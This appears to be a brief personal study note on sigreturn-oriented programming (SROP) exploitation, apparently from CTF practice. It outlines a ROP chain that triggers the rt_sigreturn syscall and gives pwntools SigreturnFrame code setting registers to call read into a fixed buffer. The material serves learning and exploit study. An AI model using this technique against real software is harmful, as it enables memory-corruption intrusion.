- NX on
- goal: ROP to call syscall w `rax = 0xf`, then set reg (srop) w payload
- [syscall](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit)
- payload = pop_rax + 0xf + syscall
  ![[SROP-1.png]]
- `payload = flat()`
- `frame = SigreturnFrame()`
- `frame.<reg_name> = <set_value>`
- eg: `frame.rip = syscall`
- payload += `bytes(frame)`
- eg: to call `read(0, char *buf, 0x100)`:
  ![[SROP-2.png]]
  ```python
  frame = SigreturnFrame()
  frame.rax = 0
  frame.rdi = 0
  frame.rsi = 0x0404000
  frame.rdx = 0x100
  frame.rsp = 0x0404000
  frame.rip = syscall
  ```
